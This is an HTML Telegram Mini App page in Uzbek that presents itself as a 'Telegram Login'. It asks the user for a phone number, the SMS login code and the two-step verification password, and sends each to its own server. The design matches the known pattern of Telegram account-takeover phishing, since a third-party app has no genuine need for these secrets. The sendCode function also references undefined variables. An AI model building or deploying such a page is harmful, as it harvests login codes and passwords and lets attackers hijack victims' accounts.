<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8" />
  <title>Telegram Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://telegram.org/js/telegram-web-app.js"></script>

  <style>
    :root {
      --bg: var(--tg-theme-bg-color, #f6f7fb);
      --card: var(--tg-theme-secondary-bg-color, #ffffff);
      --text: var(--tg-theme-text-color, #111);
      --hint: var(--tg-theme-hint-color, #6b7280);
      --btn: var(--tg-theme-button-color, #4f46e5);
      --btn-text: var(--tg-theme-button-text-color, #fff);
      --danger: #ef4444;
      --success: #22c55e;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      background: var(--bg);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
        Roboto, Helvetica, Arial, sans-serif;
      color: var(--text);
    }

    .container {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }

    .card {
      width: 100%;
      max-width: 360px;
      background: var(--card);
      border-radius: 16px;
      padding: 24px 20px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.08);
    }

    .title {
      text-align: center;
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 20px;
    }

    .field { margin-bottom: 14px; }

    input {
      width: 100%;
      height: 44px;
      padding: 0 14px;
      border-radius: 10px;
      border: 1px solid #d1d5db;
      font-size: 15px;
      background: transparent;
      color: var(--text);
    }

    input:focus {
      outline: none;
      border-color: var(--btn);
    }

    button {
      width: 100%;
      height: 46px;
      border-radius: 12px;
      border: none;
      background: var(--btn);
      color: var(--btn-text);
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    button.secondary {
      margin-top: 10px;
      background: transparent;
      color: var(--btn);
      border: 1px solid var(--btn);
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .message {
      margin-top: 14px;
      text-align: center;
      font-size: 14px;
      color: var(--hint);
    }

    .message.error { color: var(--danger); }
    .message.success { color: var(--success); }

    .hidden { display: none; }
  </style>
</head>

<body>
<div class="container">
  <div class="card">
    <div class="title">üîê Telegram orqali kirish</div>

    <!-- TELEFON -->
    <div id="step-phone">
      <div class="field">
        <input id="phone" placeholder="+998901234567" />
      </div>
      <button onclick="sendCode()">Kod yuborish</button>
    </div>

    <!-- SMS KOD -->
    <div id="step-code" class="hidden">
      <div class="field">
        <input id="code" placeholder="SMS orqali kelgan kod" />
      </div>
      <button onclick="verifyCode()">Tasdiqlash</button>
      <button id="resendBtn" class="secondary" onclick="resendCode()" disabled>
        Qayta kod yuborish (60s)
      </button>
    </div>

    <!-- 2FA -->
    <div id="step-password" class="hidden">
      <div class="field">
        <input id="password" type="password" placeholder="Telegram parolingiz" />
      </div>
      <button onclick="verifyPassword()">Kirish</button>
    </div>

    <div id="message" class="message"></div>
  </div>
</div>

<script>
const tg = window.Telegram.WebApp;
let resendTimer = null;
let resendLeft = 60;

function showMessage(text, type="info") {
  const el = document.getElementById("message");
  el.innerText = text;
  el.className = "message " + type;
}

/* =====================
   KOD YUBORISH
===================== */
function sendCode() {
  const phone = document.getElementById("phone").value.trim();
  if (!phone.startsWith("+")) {
    showMessage("‚ùå Telefon raqam + bilan boshlanishi kerak.", "error");
    return;
  }

  showMessage("üì® Kod yuborilmoqda, iltimos kuting...", "info");

  fetch("/send_code", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ phone, code, password })
  })
  .then(r => r.json())
  .then(data => {
    if (data.status === "ok") {
      document.getElementById("step-phone").classList.add("hidden");
      document.getElementById("step-code").classList.remove("hidden");
      showMessage("üì© Kod yuborildi. SMS ni tekshiring.", "success");
      startResendTimer();
    } else {
      showMessage(data.message || "‚ùå Kod yuborilmadi.", "error");
    }
  })
  .catch(() => showMessage("‚ùå Server bilan bog‚Äòlanib bo‚Äòlmadi.", "error"));
}

/* =====================
   QAYTA KOD
===================== */
function resendCode() {
  resendLeft = 60;
  sendCode();
}

/* =====================
   TIMER
===================== */
function startResendTimer() {
  const btn = document.getElementById("resendBtn");
  btn.disabled = true;
  resendLeft = 60;
  btn.innerText = `Qayta kod yuborish (${resendLeft}s)`;

  resendTimer = setInterval(() => {
    resendLeft--;
    btn.innerText = `Qayta kod yuborish (${resendLeft}s)`;
    if (resendLeft <= 0) {
      clearInterval(resendTimer);
      btn.disabled = false;
      btn.innerText = "Qayta kod yuborish";
    }
  }, 1000);
}

/* =====================
   KOD TEKSHIRISH
===================== */
function verifyCode() {
  const phone = document.getElementById("phone").value.trim();
  const code = document.getElementById("code").value.trim();

  showMessage("üîç Kod tekshirilmoqda...", "info");

  fetch("/verify_code", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ phone, code })
  })
  .then(r => r.json())
  .then(data => {
    if (data.status === "ok") {
      showMessage("‚úÖ Muvaffaqiyatli kirdingiz.", "success");
      setTimeout(() => tg.close(), 1200);
    } else if (data.status === "2fa_required") {
      document.getElementById("step-code").classList.add("hidden");
      document.getElementById("step-password").classList.remove("hidden");
      showMessage("üîê Ikki bosqichli himoya yoqilgan. Parolni kiriting.", "info");
    } else {
      showMessage("‚ùå Kod noto‚Äòg‚Äòri yoki eskirgan.", "error");
    }
  })
  .catch(() => showMessage("‚ùå Server xatosi.", "error"));
}

/* =====================
   2FA PAROL
===================== */
function verifyPassword() {
  const phone = document.getElementById("phone").value.trim();
  const password = document.getElementById("password").value;

  showMessage("üîì Parol tekshirilmoqda...", "info");

  fetch("/verify_password", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ phone, password })
  })
  .then(r => r.json())
  .then(data => {
    if (data.status === "ok") {
      showMessage("‚úÖ Kirish yakunlandi.", "success");
      setTimeout(() => tg.close(), 1200);
    } else {
      showMessage("‚ùå Parol noto‚Äòg‚Äòri.", "error");
    }
  })
  .catch(() => showMessage("‚ùå Server xatosi.", "error"));
}
</script>
</body>
</html>
